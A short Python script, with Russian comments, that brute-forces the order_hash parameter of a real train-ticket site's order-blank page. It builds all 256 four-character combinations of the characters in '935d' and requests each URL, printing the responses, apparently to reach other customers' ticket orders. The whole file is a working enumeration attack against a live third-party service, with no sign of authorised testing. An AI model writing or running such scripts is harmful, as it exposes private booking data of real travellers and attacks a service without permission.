import urllib.request
hash = str('935d')
hash_l = (list(hash))
pos = len(hash_l)  # Количество эллементов массива
print(pow(pos, pos))  # Количество возможных комбинаций
for num_9 in range(pos):
    for num_3 in range(pos):
        for num_5 in range(pos):
            for num_d in range(pos):
                list_i = (hash_l[num_9]+hash_l[num_3]+hash_l[num_5]+hash_l[num_d])
                print(list_i)
                get = urllib.request.urlopen('https://www.tutu.ru/poezda/order/blank/?order_hash={0}'.format(list_i))
                print(get)
